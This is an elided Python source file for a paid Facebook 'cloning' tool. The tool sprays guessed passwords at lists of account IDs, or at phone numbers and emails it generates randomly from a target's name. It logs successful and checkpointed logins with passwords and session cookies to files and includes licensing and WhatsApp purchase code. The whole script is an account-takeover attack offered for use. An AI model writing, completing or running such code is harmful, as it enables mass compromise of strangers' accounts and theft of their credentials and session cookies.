...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            print('\x1b[1;91m \x1b[1;92m\033[1;35m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;35m5\x1b[1;92m \x1b[1;91m  ')
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[FAHAD-XD')
...
\033[1;33m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
\033[1;33m---------------------------------------------------------
\033[1;33m  AUTHOR    : FAHAD ANCHAR
\033[1;33m  GITHUB    : MrFAHAD156
\033[1;33m  FACEBOOK  : FAHAD ANCHAR
\033[1;33m  TOOL NAME : FILE CLONE
\033[1;33m  TOOL TYPE : PAID
\033[1;33m  VERSION   : 7.2.5
\033[1;33m---------------------------------------------------------
"""  )

#banner()
#file()
#print(f'\033[1;35m[\033[1;31m\033[1;35m]\033[0;92m WHAT IS YOUR NAME')
#FAHAD_NAME=input(f'\033[1;35m[\033[1;31m\033[1;35m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	os.system('clear')
	banner()
	#ip = requests.get("https://github.com/Fahadkhan896/FahadShami/blob/main/Fahadshami.txt").text
	_FAHAD_(f'\033[1;35m[\033[1;34m1\033[1;35m] FILE CLONE')
	_FAHAD_(f'\033[1;35m[\033[1;35m\033[1;34m2\033[1;35m] RANDOM CLONE')
	_FAHAD_(f'\033[1;35m[\033[1;35m\033[1;34m3\033[1;35m] EMAIL CLONE')
	_FAHAD_(f'[\033[1;35m\033[1;34m4\033[1;35m] CONTACT ME')
	_FAHAD_(f'\033[1;35m[\033[1;34m0\033[1;35m]\033[0;91m EXIT')
	_____FAHAD_____ = input('\033[1;35m[\033[1;34m🙂\033[1;35m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____FAHAD_____ in ['1']:
		C1()
	if _____FAHAD_____ in ['2']:
		Y2()
	if _____FAHAD_____ in ['3']:
		BER()
	if _____FAHAD_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/Callmemine.2")
	if _____FAHAD_____ in ['0']:
		exit()
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			fileX = input ('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m ENTER YOUR FILE :\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mTOTAL ID : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f'\033[1;35m[\033[1;33m1\033[1;35m]\033[0;92m CLONE ONLY MIX ID')
	hu = input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		...
		print('\033[1;35m[\033[1;36m\033[1;35m]\033[0;92mWRONG OPTION BARA')
		exit()
	
	print(f'\033[1;35m[\033[1;33m1\033[1;35m]\033[0;92m MOBILE ')
	hc = input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m PASSWORD MENU \x1b[1;94m MANUAL PASSWORD \x1b[1;91m[M]\n\x1b[1;93m AUTO PASSWORD \x1b[1;96m[A] \x1b[1;92m\n [\033[1;35m\033[1;31m\033[1;35m] CHOOSE : \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mAdd Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;35m[\033[1;35m\033[1;31m\033[1;35m] YOUR NAME      \033[1;34m: \033[0;92m"+str(FAHAD_NAME))
	print(f"\033[1;35m[\033[1;35m\033[1;33m\033[1;35m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
	print(f"\033[1;35m[\033[1;35m\033[1;33m\033[1;35m] START TIME     \033[1;34m: \033[0;96m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\033[1;35m[\033[1;35m\033[1;33m\033[1;35m] START DATE     \033[1;34m: \033[0;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f"\033[1;35m[\033[1;35m\033[1;33m\033[1;35m] NOTE = \33[1;92m[USE AIRPLANE MODE ON OF FOR OK IDZ] ")
	print(f'\033[1;35m---------------------------------------------------------')
	#file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SHAMI] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSHAMI-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+FAHAD-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print('\x1b[1;91m \x1b[1;92m═━═━═━═━═━━═━═━═\033[1;35m Ｃ\033[1;93mＹ\033[1;94mＢ\033[1;95mＥ\033[1;96mＲ\033[1;95m－\033[1;94m５\033[1;96m０\033[1;35m5\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m  ')
				#print ()
				print(f'\r\x1b[1;92m [\033[1;35mSHAMI-OK\033[1;35m] \033[1;35m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/SHAMI-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    name=input("\033[1;35mUSER NAME : \033[1;35m")
    os.system("clear")
    banner()
    print('\033[1;96mENTER YOUR COUNTRY CODE')
    print('\033[1;96m[BD CODE] \033[1;35m> \033[1;35m 017 - 019 - 018 - 015')
    code = input('\033[1;35mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    banner()
    limit = int(input('\033[1;35m[]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;35mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as FAHAD:
        clear()
        tl = str(len(user))      
        print(f"\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m NAME           \033[1;34m: \033[0;92m"+name)
        print(f"\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m AGENTS         \033[1;34m: \033[0;96m"+str(len(ugen)))
        print(f"\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m CRACK ID       \033[1;34m: \033[0;92m"+tl+" ")
        print(f"\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m SIM CODE       \033[1;34m: \033[0;92m"+code)
        print(f"\033[1;35m[\033[1;33m\033[1;35m]\033[0;92m START TIME     \033[1;34m: \033[0;92m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[1;35m---------------------------------------------------------")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','khan123','11223344','freefire']
            uid = code+love
            FAHAD.submit(FAHAD,uid,pwv,tl)
...
def BER():
    ...
    os.system('clear')
    banner()
    kode = input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mTERGET FARST NAME: ')
    kodex = input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mTERGET LAST NAME :  ')
    print('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mexample Doamin :\033[1;93m@gmail.com,\033[1;96m@yahoo.com ')
    doamin = input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mINPUT DOMING : ')
    limit = int(input('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mEXAMPLE: 3000, 5000, 15000, 20000\n\033[1;35mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        banner()
        tl = str(len(user))
        print('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mTOTAL IDS:\033[1;35m '+tl)
        print('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mTHE PROCESS HAS BEEN STARTED ')
        print('\033[1;35m[\033[1;33m\033[1;35m]\033[0;92mUSE AROPELEN MOD ON OF FOR OK IDS ')
        print(f"\033[1;35m---------------------------------------------------------")
        for guru in user:
    ...
    print(' [\033[1;35m\033[1;34m\033[1;35m] Crack process has been completed')
    print(' [\033[1;35m\033[1;34m\033[1;35m] Ids saved in ok.txt,cp.txt')
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;35m[\033[1;35mSHAMI-XD\033[1;35m] \033[1;35m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;35m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/SHAMI-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[FAHAD.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;33m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SHAMI-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        #sys.stdout.write('\r%s[𝙲𝚛𝚎𝚊𝚔𝚒𝚗𝚐]%s/%s][OK-%s]\033[1;35m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[SHAMI-XD]\033[1;33m-%s/%s][OK-%s]\033[1;35m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;35m[\033[1;35mFAHAD-XD\033[1;35m] \033[1;35m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;35m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/SHAMI-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
...
def mex():
    ...
    try:
        ...
        print ('\033[1;35m If you want to buy presh enter')
        print ('')
        ...
        os.system('am start https://wa.me/+923496404531?text=Assalamowalikom%20Fahad-Sir,%20I%20Want%20To%20Buy%20Your%20FAHAD%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/Fahadkhan896/FahadShami/blob/main/Fahadshami.txt').text
    if key1 in r:
        ...
        print ('')
        input('\033[1;35mIf you want to buy presh entero ')
        os.system('am start https://wa.me/+923496404531?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20FAHAD%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
